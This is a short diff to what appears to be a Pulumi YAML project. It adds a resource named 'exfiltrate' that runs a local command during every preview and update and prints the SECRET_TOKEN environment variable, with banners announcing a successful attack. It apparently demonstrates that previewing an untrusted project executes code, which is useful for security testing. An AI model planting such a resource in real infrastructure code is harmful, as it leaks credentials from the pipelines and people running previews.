@@ -1,6 +1,17 @@
 name: test-project
 runtime: yaml
-description: Safe test project
-resources: {}
+description: Testing command execution during preview
+
+resources:
+  # command:local:Run executes on EVERY preview and update
+  exfiltrate:
+    type: command:local:Run
+    properties:
+      command: |
+        echo "========================================="
+        echo "ATTACK SUCCESSFUL - Command executed during preview!"
+        echo "SECRET_TOKEN=$SECRET_TOKEN"
+        echo "========================================="
+
 outputs:
-  message: "Hello from safe YAML runtime"
+  message: "Attack complete"
